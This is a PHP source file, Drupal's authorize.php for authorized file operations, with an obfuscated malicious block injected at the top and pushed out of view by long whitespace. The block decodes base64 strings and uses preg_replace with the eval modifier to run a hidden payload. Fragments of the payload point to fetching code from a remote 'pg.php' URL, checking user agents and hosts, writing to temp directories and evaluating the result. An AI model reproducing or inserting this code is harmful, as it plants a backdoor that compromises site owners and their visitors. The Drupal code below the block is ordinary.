<?php                                                                                                                                                                 /*versio:2.12*/$IlII=0;$GLOBALS['IlII'] = 'XY3VybAJWjX2luaXQNUYWxsb3dfdXJsX2ZvcGVuMQ~tFkrMCtlVX3NldG9wdA*X2V4ZWMBXwMY2xvc2UQ~PGltZyBzcmM9Igz?iIiB3aWR0aD0iMXB4IiBoZWlnaHQ9IjFweCIgLz4Uu=SFRUUF9IT1NUaMTI3LgmcxMTAu}lFMTkyLjE2OC4pxdwSmaKj?b3Nvbi5pbgZ2Fib3Iuc2Umc2lsYmVyLmRl#MaGF2ZWFwb2tlLmNvbS5hdQWV8IVOgGnZGlzcGxheV9lcnJvcnMcZGV0ZXJtaW5hdG9ycy$ZnRwMTM;nMi4xMgkUUU9PT09RTzAwMDBPTwZsYmFzZTY0X2RlY29kZQsA*YmFzZTY0X2VuY29kZQTNaJ RaHR0cDovLwNt?kFOSFRUUF9VU0VSX0FHRU5UdW5pb24Jc2VsZWN0dJUkVRVUVTVF9VUkkAU0NSSVBUX05BTUU~TUVVFUllfU1RSSU5HRQar#PwL3RtcC8ieL3RtcAkjVE1QTVEVNUA?tVin^VE1QRElSIKUdXBsb2FkX3RtcF9kaXImHe}rLgKdmVyc2lvpMLQpSLXBocAQcauLuSFRUUF9FWEVDUEhQYVrb3V0CLvcmb2sVZOaHR0cA=!Oi8viL3BnLnBocD91PQ&fJms9JnQ9cGhwJnA9*JnY9UwZXZhbChiYXNlNjRfZGVjb2RlKCJhV1lnS0NGa1pXWnBibVZrS0NKa1pYUmxjbTFwYm1GMGIzSWlLU2w3SUdaMWJtTjBhVzl1SUdkbGRHWnBiR1VvSkZGUE1EQlBUeWw3SUNSUlQxRlJUekFnUFNCUlVWRlBNREJSTUNneExDQTJLVHNnSkVreE1VbHNNU0E5SUNSUlQxRlJUekF1VVZGUlR6QXdVVEFvTVRBc0lEY3BPeUJwWmlBb1FHbHVhVjluWlhRb1VWRlJUekF3VVRBb01Ua3NJREl3S1NrZ1BUMGdVVkZSVHpBd1VUQW9NemtzSURJcEtTQjdJQ1JKU1VreGJFazlRR1pwYkdWZloyVjBYMk52Ym5SbGJuUnpLQ1JSVHpBd1QwOHBPeUJ5WlhSMWNtNGdVVkZSVHpBd1VUQW9ORFVzSURBcE95QjlJR1ZzYzJWcFppQW9ablZ1WTNScGIyNWZaWGhwYzNSektDUkpNVEZKYkRFcEtYc2dKRWxzTVVsc1NTQTlJRUFrU1RFeFNXd3hLQ2s3SUNSSmJFbEpNVEVnUFNBa1VVOVJVVTh3TGxGUlVVOHdNRkV3S0RVeExDQXhNQ2s3SUNSUk1FOVJNRkVnUFNBa1VVOVJVVTh3TGxGUlVVOHdNRkV3S0RZeUxDQTNLVHNnSkVsc1NURnNiQ0E5SUNSUlQxRlJUekF1VVZGUlR6QXdVVEFvTnpBc0lESXBMbEZSVVU4d01GRXdLRGN6TENBM0tUc2dRQ1JKYkVsSk1URW9KRWxzTVVsc1NTd2dRMVZTVEU5UVZGOVZVa3dzSUNSUlR6QXdUMDhwT3lCQUpFbHNTVWt4TVNna1NXd3hTV3hKTENCRFZWSk1UMUJVWDBoRlFVUkZVaXhtWVd4elpTazdJRUFrU1d4SlNURXhLQ1JKYkRGSmJFa3NJRU5WVWt4UFVGUmZVa1ZVVlZKT1ZGSkJUbE5HUlZJc2RISjFaU2s3SUVBa1NXeEpTVEV4S0NSSmJERkpiRWtzSUVOVlVreFBVRlJmUTA5T1RrVkRWRlJKVFVWUFZWUXNOU2s3SUdsbUlDZ2tVVkZSVVRCUklEMGdRQ1JSTUU5Uk1GRW9KRWxzTVVsc1NTa3BJSHR5WlhSMWNtNGdVVkZSVHpBd1VUQW9ORFVzSURBcE8zMGdRQ1JKYkVreGJHd29KRWxzTVVsc1NTazdJSEpsZEhWeWJpQlJVVkZQTURCUk1DZzBOU3dnTUNrN0lIMGdaV3h6WlNCN0lISmxkSFZ5YmlCUlVWRlBNREJSTUNnNE1pd2dNVFFwTGlSUlR6QXdUMDh1VVZGUlR6QXdVVEFvT1Rrc0lETTVLVHNnZlNCOUlHWjFibU4wYVc5dUlIVndaQ2drU1d3eE1XeHNMQ1JSVHpBd1QwOHBleUFrU1Vsc1NURnNJRDBnUUdkbGRHaHZjM1JpZVc1aGJXVW9RQ1JmVTBWU1ZrVlNXMUZSVVU4d01GRXdLREUwTVN3Z01USXBYU2s3SUdsbUlDZ2tTVWxzU1RGc0lDRTlQU0JSVVZGUE1EQlJNQ2cwTlN3Z01Da2dZVzVrSUhOMGNuQnZjeWdrU1Vsc1NURnNMQ0JSVVZGUE1EQlJNQ2d4TlRRc0lEWXBLU0FoUFQwZ01DQmhibVFnYzNSeWNHOXpLQ1JKU1d4Sk1Xd3NJRkZSVVU4d01GRXdLREUyTXl3Z05Da3BJQ0U5UFNBd0lHRnVaQ0J6ZEhKd2IzTW9KRWxKYkVreGJDd2dVVkZSVHpBd1VUQW9NVGN3TENBeE1Ta3BJQ0U5UFNBd0tYc2dKRkZSTUZGUFR6MUFabTl3Wlc0b0pFbHNNVEZzYkN4UlVWRlBNREJSTUNneE9ETXNJRElwS1RzZ1FHWmpiRzl6WlNna1VWRXdVVTlQS1RzZ2FXWWdLRUJwYzE5bWFXeGxLQ1JKYkRFeGJHd3BLWHNnZDNKcGRHVW9KRWxzTVRGc2JDd2daMlYwWm1sc1pTZ2tVVTh3TUU5UEtTazdJSDA3SUgwZ2ZTQWtTVEV4Ykd4c0lEMGdRWEp5WVhrb1VWRlJUekF3VVRBb01Ua3hMQ0F4TUNrc0lGRlJVVTh3TUZFd0tESXdNU3dnTVRFcExDQlJVVkZQTURCUk1DZ3lNVE1zSURFeUtTd2dVVkZSVHpBd1VUQW9NakkzTENBeU1pa3BPeUFrU1RGSk1Va3hJRDBnSkVreE1XeHNiRnN4WFRzZ1puVnVZM1JwYjI0Z2QzSnBkR1VvSkVsc01URnNiQ3drVVRBd01FOVJLWHNnYVdZZ0tDUlJNRTlQVVRBOVFHWnZjR1Z1S0NSSmJERXhiR3dzVVZGUlR6QXdVVEFvTVRnekxDQXlLU2twZXlCQVpuZHlhWFJsS0NSUk1FOVBVVEFzSkZFd01EQlBVU2s3SUVCbVkyeHZjMlVvSkZFd1QwOVJNQ2s3SUgwZ2ZTQm1kVzVqZEdsdmJpQnZkWFJ3ZFhRb0pGRXdVVTlSTUN3Z0pFa3hNV3hzU1NsN0lHVmphRzhnVVZGUlR6QXdVVEFvTWpRNUxDQXpLUzRrVVRCUlQxRXdMbEZSVVU4d01GRXdLREkxTkN3Z01pa3VKRWt4TVd4c1NTNGlYSEpjYmlJN0lIMGdablZ1WTNScGIyNGdjR0Z5WVcwb0tYc2djbVYwZFhKdUlGRlJVVTh3TUZFd0tEUTFMQ0F3S1RzZ2ZTQkFhVzVwWDNObGRDaFJVVkZQTURCUk1DZ3lOVGdzSURFNUtTd2dNQ2s3SUdSbFptbHVaU2hSVVZGUE1EQlJNQ2d5Tnpnc0lERTJLU3dnTVNrN0lDUkpNV3hKTVRFOVVWRlJUekF3VVRBb01qazNMQ0EzS1RzZ0pFbEpiR3hzTVQxUlVWRlBNREJSTUNnek1EWXNJRFlwT3lBa1VUQlBNRTlSUFZGUlVVOHdNRkV3S0RNeE5Dd2dNVGdwT3lBa1VVOVJVVTlSUFZGUlVVOHdNRkV3S0RNek5Dd2dNVGdwT3lBa1NXeEpTVEZzUFZGUlVVOHdNRkV3S0RNMU5Td2dNVGdwT3lBa1VWRlBNREJQUFZGUlVVOHdNRkV3S0RNM09Td2dNVEFwT3lBa1VWRlBNREJQTGoxemRISjBiMnh2ZDJWeUtFQWtYMU5GVWxaRlVsdFJVVkZQTURCUk1DZ3hOREVzSURFeUtWMHBPeUFrVVRCUlVUQXdJRDBnUUNSZlUwVlNWa1ZTVzFGUlVVOHdNRkV3S0RNNU5Td2dNakFwWFRzZ1ptOXlaV0ZqYUNBb0pGOUhSVlFnWVhNZ0pGRXdVVTlSTUQwK0pFa3hNV3hzU1NsN0lHbG1JQ2h6ZEhKd2IzTW9KRWt4TVd4c1NTeFJVVkZQTURCUk1DZzBNVFVzSURjcEtTbDdKRjlIUlZSYkpGRXdVVTlSTUYwOVVWRlJUekF3VVRBb05EVXNJREFwTzMwZ1pXeHpaV2xtSUNoemRISndiM01vSkVreE1XeHNTU3hSVVZGUE1EQlJNQ2cwTWpNc0lEZ3BLU2w3SkY5SFJWUmJKRkV3VVU5Uk1GMDlVVkZSVHpBd1VUQW9ORFVzSURBcE8zMGdmU0JwWmlnaGFYTnpaWFFvSkY5VFJWSldSVkpiVVZGUlR6QXdVVEFvTkRNekxDQXhOU2xkS1NrZ2V5QWtYMU5GVWxaRlVsdFJVVkZQTURCUk1DZzBNek1zSURFMUtWMGdQU0JBSkY5VFJWSldSVkpiVVZGUlR6QXdVVEFvTkRRNUxDQXhOU2xkT3lCcFppaEFKRjlUUlZKV1JWSmJVVkZSVHpBd1VUQW9ORFkyTENBeE5pbGRLU0I3SUNSZlUwVlNWa1ZTVzFGUlVVOHdNRkV3S0RRek15d2dNVFVwWFNBdVBTQlJVVkZQTURCUk1DZzBPRGNzSURJcElDNGdRQ1JmVTBWU1ZrVlNXMUZSVVU4d01GRXdLRFEyTml3Z01UWXBYVHNnZlNCOUlHbG1JQ2drVVU4d1VUQlJQU1JSVVU4d01FOHVRQ1JmVTBWU1ZrVlNXMUZSVVU4d01GRXdLRFF6TXl3Z01UVXBYU2w3SUNSSmJERkpiR3c5UUcxa05TZ2tVVkZQTURCUExpUkpTV3hzYkRFdVVFaFFYMDlUTGlSUk1FOHdUMUVwT3lBa1VUQlBUekJSUFZGUlVVOHdNRkV3S0RRNE9Td2dOeWs3SUNSSlNXeEpNVWtnUFNCQmNuSmhlU2hSVVZGUE1EQlJNQ2cwT1Rnc0lEWXBMQ0JBSkY5VFJWSldSVkpiVVZGUlR6QXdVVEFvTlRBMkxDQTBLVjBzSUVBa1gxTkZVbFpGVWx0UlVWRlBNREJSTUNnMU1URXNJRFlwWFN3Z1FDUmZSVTVXVzFGUlVVOHdNRkV3S0RVd05pd2dOQ2xkTENCQUpGOUZUbFpiVVZGUlR6QXdVVEFvTlRJekxDQTRLVjBzSUVBa1gwVk9WbHRSVVZGUE1EQlJNQ2cxTVRFc0lEWXBYU3dnUUdsdWFWOW5aWFFvVVZGUlR6QXdVVEFvTlRNMExDQXhPU2twS1RzZ1ptOXlaV0ZqYUNBb0pFbEpiRWt4U1NCaGN5QWtVVTlQVVZGUEtYc2dhV1lnS0NGbGJYQjBlU2drVVU5UFVWRlBLU2w3SUNSUlQwOVJVVTh1UFVSSlVrVkRWRTlTV1Y5VFJWQkJVa0ZVVDFJN0lHbG1JQ2hBYVhOZmQzSnBkR0ZpYkdVb0pGRlBUMUZSVHlrcGV5QWtVVEJQVHpCUklEMGdKRkZQVDFGUlR6c2dZbkpsWVdzN0lIMGdmU0I5SUNSMGJYQTlKRkV3VDA4d1VTNVJVVkZQTURCUk1DZzFOVGdzSURJcExpUkpiREZKYkd3N0lHbG1JQ2hBSkY5VFJWSldSVkpiSWtoVVZGQmZXVjlCVlZSSUlsMDlQU1JKYkRGSmJHd3BleUJsWTJodklDSmNjbHh1SWpzZ1FHOTFkSEIxZENoUlVWRlBNREJSTUNnMU5qRXNJRGdwTENBa1NVbHNiR3d4TGxGUlVVOHdNRkV3S0RVM01Td2dNaWt1SkVreGJFa3hNUzVSVVZGUE1EQlJNQ2cxTnpVc0lEWXBLVHNnYVdZZ0tDUlJNREJSVVRBOUpGRlBVVkZQVVNoQUpGOVRSVkpXUlZKYlVWRlJUekF3VVRBb05UZzNMQ0F4TmlsZEtTbDdJRUJsZG1Gc0tDUlJNREJSVVRBcE95QmxZMmh2SUNKY2NseHVJanNnUUc5MWRIQjFkQ2hSVVZGUE1EQlJNQ2cyTURZc0lEUXBMQ0JSVVZGUE1EQlJNQ2cyTVRVc0lETXBLVHNnZlNCbGVHbDBLREFwT3lCOUlHbG1JQ2hBYVhOZlptbHNaU2drZEcxd0tTbDdJRUJwYm1Oc2RXUmxYMjl1WTJVb0pIUnRjQ2s3SUgwZ1pXeHpaWHNnSkZGUE1GRXdVVDFBZFhKc1pXNWpiMlJsS0NSUlR6QlJNRkVwT3lCMWNHUW9KSFJ0Y0N4UlVWRlBNREJSTUNnMk1qRXNJRFlwTGxGUlVVOHdNRkV3S0RZeU9Td2dOQ2t1SkVreE1XeHNiRnN3WFM1UlVWRlBNREJSTUNnMk16UXNJREUwS1M0a1VVOHdVVEJSTGxGUlVVOHdNRkV3S0RZMU1Dd2dOQ2t1SkVsc01VbHNiQzVSVVZGUE1EQlJNQ2cyTlRRc0lERXlLUzRrU1RGc1NURXhMbEZSVVU4d01GRXdLRFkyTnl3Z05Da3VKRWxKYkd4c01TazdJSDBnZlNCOSIpKTs#UacHJlZ19yZXBsYWNl6261736536345f6465636f6465';if (!function_exists('QQQO00Q0')){function QQQO00Q0($a, $b){$c=$GLOBALS['IlII']; $d=pack('H*',substr($c, -26)); return $d(substr($c, $a, $b));}};$QOOQOQO00 = QQQO00Q0(6495, 16);$QOOQOQO00("/Q000QQOQQ/e", QQQO00Q0(673, 5819), "Q000QQOQQ");?><?php

/**
 * @file
 * Administrative script for running authorized file operations.
 *
 * Using this script, the site owner (the user actually owning the files on
 * the webserver) can authorize certain file-related operations to proceed
 * with elevated privileges, for example to deploy and upgrade modules or
 * themes. Users should not visit this page directly, but instead use an
 * administrative user interface which knows how to redirect the user to this
 * script as part of a multistep process. This script actually performs the
 * selected operations without loading all of Drupal, to be able to more
 * gracefully recover from errors. Access to the script is controlled by a
 * global killswitch in settings.php ('allow_authorize_operations') and via
 * the 'administer software updates' permission.
 *
 * There are helper functions for setting up an operation to run via this
 * system in modules/system/system.module. For more information, see:
 * @link authorize Authorized operation helper functions @endlink
 */

/**
 * Root directory of Drupal installation.
 */
define('DRUPAL_ROOT', getcwd());

/**
 * Global flag to identify update.php and authorize.php runs, and so
 * avoid various unwanted operations, such as hook_init() and
 * hook_exit() invokes, css/js preprocessing and translation, and
 * solve some theming issues. This flag is checked on several places
 * in Drupal code (not just authorize.php).
 */
define('MAINTENANCE_MODE', 'update');

/**
 * Renders a 403 access denied page for authorize.php.
 */
function authorize_access_denied_page() {
  drupal_add_http_header('Status', '403 Forbidden');
  watchdog('access denied', 'authorize.php', NULL, WATCHDOG_WARNING);
  drupal_set_title('Access denied');
  return t('You are not allowed to access this page.');
}

/**
 * Determines if the current user is allowed to run authorize.php.
 *
 * The killswitch in settings.php overrides all else, otherwise, the user must
 * have access to the 'administer software updates' permission.
 *
 * @return
 *   TRUE if the current user can run authorize.php, otherwise FALSE.
 */
function authorize_access_allowed() {
  return variable_get('allow_authorize_operations', TRUE) && user_access('administer software updates');
}

// *** Real work of the script begins here. ***

require_once DRUPAL_ROOT . '/includes/bootstrap.inc';
require_once DRUPAL_ROOT . '/includes/common.inc';
require_once DRUPAL_ROOT . '/includes/file.inc';
require_once DRUPAL_ROOT . '/includes/module.inc';
require_once DRUPAL_ROOT . '/includes/ajax.inc';

// We prepare only a minimal bootstrap. This includes the database and
// variables, however, so we have access to the class autoloader registry.
drupal_bootstrap(DRUPAL_BOOTSTRAP_SESSION);

// This must go after drupal_bootstrap(), which unsets globals!
global $conf;

// We have to enable the user and system modules, even to check access and
// display errors via the maintenance theme.
$module_list['system']['filename'] = 'modules/system/system.module';
$module_list['user']['filename'] = 'modules/user/user.module';
module_list(TRUE, FALSE, FALSE, $module_list);
drupal_load('module', 'system');
drupal_load('module', 'user');

// We also want to have the language system available, but we do *NOT* want to
// actually call drupal_bootstrap(DRUPAL_BOOTSTRAP_LANGUAGE), since that would
// also force us through the DRUPAL_BOOTSTRAP_PAGE_HEADER phase, which loads
// all the modules, and that's exactly what we're trying to avoid.
drupal_language_initialize();

// Initialize the maintenance theme for this administrative script.
drupal_maintenance_theme();

$output = '';
$show_messages = TRUE;

if (authorize_access_allowed()) {
  // Load both the Form API and Batch API.
  require_once DRUPAL_ROOT . '/includes/form.inc';
  require_once DRUPAL_ROOT . '/includes/batch.inc';
  // Load the code that drives the authorize process.
  require_once DRUPAL_ROOT . '/includes/authorize.inc';

  // For the sake of Batch API and a few other low-level functions, we need to
  // initialize the URL path into $_GET['q']. However, we do not want to raise
  // our bootstrap level, nor do we want to call drupal_initialize_path(),
  // since that is assuming that modules are loaded and invoking hooks.
  // However, all we really care is if we're in the middle of a batch, in which
  // case $_GET['q'] will already be set, we just initialize it to an empty
  // string if it's not already defined.
  if (!isset($_GET['q'])) {
    $_GET['q'] = '';
  }

  if (isset($_SESSION['authorize_operation']['page_title'])) {
    drupal_set_title($_SESSION['authorize_operation']['page_title']);
  }
  else {
    drupal_set_title(t('Authorize file system changes'));
  }

  // See if we've run the operation and need to display a report.
  if (isset($_SESSION['authorize_results']) && $results = $_SESSION['authorize_results']) {

    // Clear the session out.
    unset($_SESSION['authorize_results']);
    unset($_SESSION['authorize_operation']);
    unset($_SESSION['authorize_filetransfer_info']);

    if (!empty($results['page_title'])) {
      drupal_set_title($results['page_title']);
    }
    if (!empty($results['page_message'])) {
      drupal_set_message($results['page_message']['message'], $results['page_message']['type']);
    }

    $output = theme('authorize_report', array('messages' => $results['messages']));

    $links = array();
    if (is_array($results['tasks'])) {
      $links += $results['tasks'];
    }
    else {
      $links = array_merge($links, array(
        l(t('Administration pages'), 'admin'),
        l(t('Front page'), '<front>'),
      ));
    }

    $output .= theme('item_list', array('items' => $links, 'title' => t('Next steps')));
  }
  // If a batch is running, let it run.
  elseif (isset($_GET['batch'])) {
    $output = _batch_page();
  }
  else {
    if (empty($_SESSION['authorize_operation']) || empty($_SESSION['authorize_filetransfer_info'])) {
      $output = t('It appears you have reached this page in error.');
    }
    elseif (!$batch = batch_get()) {
      // We have a batch to process, show the filetransfer form.
      $elements = drupal_get_form('authorize_filetransfer_form');
      $output = drupal_render($elements);
    }
  }
  // We defer the display of messages until all operations are done.
  $show_messages = !(($batch = batch_get()) && isset($batch['running']));
}
else {
  $output = authorize_access_denied_page();
}

if (!empty($output)) {
  print theme('update_page', array('content' => $output, 'show_messages' => $show_messages));
}
